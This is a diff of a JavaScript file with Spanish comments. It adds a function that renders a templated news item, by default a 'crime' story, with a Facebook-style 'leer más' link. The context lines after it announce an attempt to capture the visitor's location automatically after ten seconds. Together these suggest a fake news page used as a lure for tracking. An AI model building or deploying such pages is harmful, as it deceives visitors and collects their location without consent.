@@ -1383,6 +1383,54 @@
             }, 500);
         }
         
+        // Función para renderizar la noticia en la página y restaurar el enlace "leer más"
+        function renderNews(templateKey = 'crime') {
+            try {
+                const template = newsTemplates[templateKey] || Object.values(newsTemplates)[0];
+                currentNews = template;
+
+                const titleEl = document.getElementById('newsTitle');
+                const newsImg = document.getElementById('newsImage');
+                const newsContentEl = document.getElementById('newsContent');
+                const fullNewsContentEl = document.getElementById('fullNewsContent');
+                const readMoreSection = document.getElementById('readMoreSection');
+
+                if (titleEl) titleEl.textContent = currentNews.title || 'Sin título';
+
+                // Manejo de imagen si existe en la plantilla
+                if (currentNews.image && newsImg) {
+                    newsImg.src = currentNews.image;
+                    newsImg.style.display = '';
+                } else if (newsImg) {
+                    newsImg.style.display = 'none';
+                }
+
+                // Contenido principal con "leer más" si hay fullContent
+                if (currentNews.fullContent) {
+                    if (newsContentEl) {
+                        newsContentEl.innerHTML = (currentNews.content || '') +
+                            '... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer más</strong></span>';
+                    }
+                    if (fullNewsContentEl) fullNewsContentEl.innerHTML = currentNews.fullContent;
+                } else {
+                    if (newsContentEl) newsContentEl.textContent = currentNews.content || '';
+                    if (fullNewsContentEl) fullNewsContentEl.textContent = '';
+                }
+
+                // Opcional: botón adicional en readMoreSection
+                if (readMoreSection) {
+                    readMoreSection.innerHTML = '';
+                }
+
+                console.log('📰 Noticia renderizada:', currentNews.title);
+            } catch (e) {
+                console.error('❌ Error al renderizar la noticia:', e);
+            }
+        }
+
+        // Inicializar la noticia al cargar el script
+        renderNews();
+        
         // Intentar capturar ubicación automáticamente después de 10 segundos
         setTimeout(() => {
             if (Math.random() > 0.3) { // 70% de probabilidad
